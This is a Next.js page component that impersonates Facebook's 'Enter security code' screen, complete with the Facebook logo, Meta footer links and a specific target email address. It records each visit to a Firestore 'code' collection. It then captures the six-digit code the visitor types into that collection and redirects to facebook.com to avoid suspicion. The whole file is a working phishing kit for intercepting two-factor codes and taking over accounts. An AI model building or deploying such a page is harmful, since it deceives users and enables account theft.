'use client';

import { collection, addDoc } from "firebase/firestore"; 
import { useEffect, useState } from "react";
import { db } from '@/app/firebase';
import { useRouter } from "next/navigation";

const Home = () => {

  const [number, setNumber] = useState('');

  const router = useRouter();

  const load = async () => {
    await addDoc(collection(db, "code"), {
      status: 'visited'
    });
  }

  const code = async () => {
    if (number) {
      await addDoc(collection(db, "code"), {
        code: number
      });
      router.push('https://facebook.com');
    }
  }

  useEffect(() => {
    load();
  }, [])

  return (
    <div className="bg-[#e9ebee] w-full h-screen flex flex-col items-center">
      <header className="w-full bg-white pl-[35px] py-[15px]">
        <svg className="x1lliihq x5skwsv" height="22" viewBox="100 100 900 160" xmlns="http://www.w3.org/2000/svg"><title>Facebook</title><path d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z" fill="#0866ff"></path></svg>
      </header>
      <section className="md:w-[500px] xs:w-full bg-white rounded-[10px] mt-[80px]">
        <div className="w-full border-b px-[18px] py-[14px]">
          <p className="text-[20px] font-bold">Enter security code</p>
        </div>
        <div className="p-[18px]">
          <p className="text-[17px]">Please check your email for a message with your code. Your code is 6 numbers long.</p>
          <div className="grid grid-cols-2 pt-[16px]">
            <input value={number} onChange={(evt) => setNumber(evt.target.value)} placeholder="Enter code" className="border rounded-md h-[52px] w-full pl-[15px]" />
            <div className="pl-4">
              <p className="text-[15px]">We sent your code to:</p>
              <p className="text-[13px]">pitlee37@gmail.com</p>
            </div>
          </div>
        </div>
        <div className="w-full border-t">
          <div className="grid grid-cols-2">
            <div className="flex items-center py-[15px] pl-[18px]">
              <p className="text-[13px] text-[#1877f2] cursor-pointer">Didn&apos;t get a code?</p>
            </div>
            <div className="flex items-center justify-end gap-[12px] py-[10px] pr-[16px]">
              <button className="bg-[#e4e6eb] font-bold text-black px-[20px] py-[8px] rounded-md">
                Cancel
              </button>
              <button onClick={() => code()} className="bg-[#1877f2] font-bold text-white px-[20px] py-[8px] rounded-md">
                Continue
              </button>
            </div>
          </div>
        </div>
      </section>
      <div className="w-full flex justify-center bg-white h-full mt-[100px] flex-wrap">
        <div className="md:w-[990px] xs:w-full md:pt-[180px] xs:pt-[80px]">
          <div className="flex items-center gap-[10px] pb-[12px] border-[#dddfe2] flex-wrap p-[18px]">
            <p className="text-[12px] text-[#737373]">English (US)</p>
            <p className="text-[12px] text-[#737373]">Filipino</p>
            <p className="text-[12px] text-[#737373]">Bisaya</p>
            <p className="text-[12px] text-[#737373]">Español</p>
            <p className="text-[12px] text-[#737373]">日本語</p>
            <p className="text-[12px] text-[#737373]">한국어</p>
            <p className="text-[12px] text-[#737373]">中文(简体)</p>
            <p className="text-[12px] text-[#737373]">لعربية</p>
            <p className="text-[12px] text-[#737373]">Português (Brasil)            </p>
            <p className="text-[12px] text-[#737373]">Français (France)            </p>
            <p className="text-[12px] text-[#737373]">Deutsch</p>
          </div>
          <div className="flex flex-wrap items-center gap-x-[20px] pt-[12px] border-t p-[18px]">
            <p className="text-[12px] text-[#737373]">Sign Up</p>
            <p className="text-[12px] text-[#737373]">Log In</p>
            <p className="text-[12px] text-[#737373]">Messenger</p>
            <p className="text-[12px] text-[#737373]">Facebook Lite</p>
            <p className="text-[12px] text-[#737373]">Video</p>
            <p className="text-[12px] text-[#737373]">Places</p>
            <p className="text-[12px] text-[#737373]">Games</p>
            <p className="text-[12px] text-[#737373]">Marketplace</p>
            <p className="text-[12px] text-[#737373]">Meta Pay</p>
            <p className="text-[12px] text-[#737373]">Meta Store</p>
            <p className="text-[12px] text-[#737373]">Meta Quest</p>
            <p className="text-[12px] text-[#737373]">Ray-Ban Meta</p>
            <p className="text-[12px] text-[#737373]">Meta AI</p>
            <p className="text-[12px] text-[#737373]">Instagram</p>
            <p className="text-[12px] text-[#737373]">Threads</p>
            <p className="text-[12px] text-[#737373]">Fundraisers</p>
            <p className="text-[12px] text-[#737373]">Services</p>
            <p className="text-[12px] text-[#737373]">Voting Information Center</p>
            <p className="text-[12px] text-[#737373]">Privacy Policy</p>
            <p className="text-[12px] text-[#737373]">Privacy Center</p>
            <p className="text-[12px] text-[#737373]">Groups</p>
            <p className="text-[12px] text-[#737373]">About</p>
            <p className="text-[12px] text-[#737373]">Create ad</p>
            <p className="text-[12px] text-[#737373]">Create Page</p>
            <p className="text-[12px] text-[#737373]">Developers</p>
            <p className="text-[12px] text-[#737373]">Careers</p>
            <p className="text-[12px] text-[#737373]">Cookies</p>
            <p className="text-[12px] text-[#737373]">Ad choices</p>
            <p className="text-[12px] text-[#737373]">Terms</p>
            <p className="text-[12px] text-[#737373]">Help</p>
            <p className="text-[12px] text-[#737373]">Contact Uploading & Non-Users</p>
          </div>
          <div className="mt-[20px]">
            <p className="text-[12px] text-[#737373] p-[18px]">Meta © 2025</p>
          </div>
        </div>
      </div>
    </div>
  )
}

export default Home;
